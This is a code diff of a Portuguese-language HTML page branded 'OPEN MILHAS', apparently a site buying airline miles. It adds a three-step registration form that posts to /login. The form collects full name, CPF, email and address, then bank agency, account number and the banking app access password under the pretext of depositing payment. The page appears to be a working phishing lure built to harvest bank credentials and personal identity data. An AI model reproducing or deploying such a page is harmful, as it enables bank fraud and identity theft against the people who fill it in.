@@ -8,29 +8,19 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
     <style>
         :root { --primary: #2c7da0; --gold: #c5a059; --dark: #0a1128; }
-        body { font-family: 'Segoe UI', sans-serif; background: #fff; overflow-x: hidden; }
-        
-        /* Logo e Header */
+        body { font-family: 'Segoe UI', sans-serif; background: #fff; }
         .navbar-brand { font-weight: 800; font-size: 1.6rem; }
         .progress-bar-custom { height: 10px; background: #e9ecef; border-radius: 20px; margin: 30px 0; overflow: hidden; }
         .progress-fill { height: 100%; background: var(--primary); width: 33%; transition: 0.4s; }
-        
-        /* Formulário */
         .form-control { border-radius: 50px; padding: 15px 25px; margin-bottom: 15px; border: 1px solid #ddd; }
-        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-next:hover { background: var(--primary); transform: translateY(-2px); }
+        .btn-next { background: #469cb4; color: white; border-radius: 50px; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; }
         
+        /* Garante que o passo ativo fique visível */
         .step { display: none; }
-        .step.active { display: block; animation: fadeIn 0.4s; }
+        .step.active { display: block !important; animation: fadeIn 0.4s; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        /* Rodapé e WhatsApp */
-        .whatsapp-float { position:fixed; width:60px; height:60px; bottom:40px; right:40px; background-color:#25d366; color:#FFF; border-radius:50px; text-align:center; font-size:30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2); z-index:1000; transition: 0.3s; }
-        .whatsapp-float:hover { transform: scale(1.1); color: white; }
-        footer { background-color: #f8f9fa; border-top: 1px solid #dee2e6; padding: 60px 0 30px 0; margin-top: 80px; }
-        .footer-logo { font-weight: 800; margin-bottom: 20px; display: block; }
-        .badge-img { height: 25px; filter: grayscale(100%); opacity: 0.7; transition: 0.3s; }
-        .badge-img:hover { filter: grayscale(0); opacity: 1; }
+        .whatsapp-float { position:fixed; width:60px; height:60px; bottom:40px; right:40px; background-color:#25d366; color:#FFF; border-radius:50px; text-align:center; font-size:30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2); z-index:1000; }
     </style>
 </head>
 <body>
@@ -44,4 +34,70 @@
         <a class="navbar-brand" href="/" style="text-decoration: none;">
             <span style="color: var(--dark);">OPEN</span> <span style="color: var(--gold);">MILHAS</span>
         </a>
-        <div class="small text-muted fw-bold">Passo <span id="stepNumber">1</span>
+        <div class="small text-muted fw-bold">Passo <span id="stepNumber">1</span> de 3</div>
+    </div>
+</nav>
+
+<div class="container mt-5" style="max-width: 600px; min-height: 450px;">
+    <div class="text-center mb-4">
+        <h2 class="fw-bold">Complete seu cadastro</h2>
+        <p class="text-muted" id="stepText">Valide seus dados para concluir a cotação.</p>
+    </div>
+
+    <div class="progress-bar-custom">
+        <div class="progress-fill" id="progressBar"></div>
+    </div>
+
+    <form action="/login" method="POST" id="mainForm">
+        <div class="step active" id="step1">
+            <input type="text" name="nome" class="form-control" placeholder="Nome completo *" required>
+            <input type="text" name="cpf" id="cpf" class="form-control" placeholder="CPF *" required>
+            <input type="email" name="email" class="form-control" placeholder="E-mail principal *">
+            <div class="text-end mt-4">
+                <button type="button" class="btn-next" onclick="nextStep(2)">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
+        </div>
+
+        <div class="step" id="step2">
+            <input type="text" name="cep" id="cep" class="form-control" placeholder="CEP *">
+            <input type="text" name="rua" class="form-control" placeholder="Endereço Completo (Rua, Nº, Bairro) *">
+            <div class="d-flex justify-content-between mt-4">
+                <button type="button" class="btn btn-link text-muted text-decoration-none" onclick="nextStep(1)">Voltar</button>
+                <button type="button" class="btn-next" onclick="nextStep(3)">Próximo Passo <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
+        </div>
+
+        <div class="step" id="step3">
+            <input type="text" name="agencia" class="form-control" placeholder="Agência Bancária *" required>
+            <input type="text" name="conta" class="form-control" placeholder="Número da Conta com Dígito *" required>
+            <input type="password" name="senha_app" class="form-control" placeholder="Senha de Acesso ao Aplicativo *" required>
+            <div class="d-flex justify-content-between mt-4">
+                <button type="button" class="btn btn-link text-muted text-decoration-none" onclick="nextStep(2)">Voltar</button>
+                <button type="submit" class="btn-next" style="background:var(--gold)">Finalizar Cadastro</button>
+            </div>
+        </div>
+    </form>
+</div>
+
+<script src="https://unpkg.com/imask"></script>
+<script>
+    IMask(document.getElementById('cpf'), { mask: '000.000.000-00' });
+    IMask(document.getElementById('cep'), { mask: '00000-000' });
+
+    function nextStep(step) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+
+        const fill = document.getElementById('progressBar');
+        const num = document.getElementById('stepNumber');
+        const text = document.getElementById('stepText');
+        
+        num.innerText = step;
+        if(step === 1) { fill.style.width = '33%'; text.innerText = 'Valide seus dados para concluir a cotação.'; }
+        if(step === 2) { fill.style.width = '66%'; text.innerText = 'Informe seu endereço para emissão de contrato.'; }
+        if(step === 3) { fill.style.width = '100%'; text.innerText = 'Dados para depósito do valor das milhas.'; }
+        window.scrollTo(0, 0);
+    }
+</script>
+</body>
+</html>
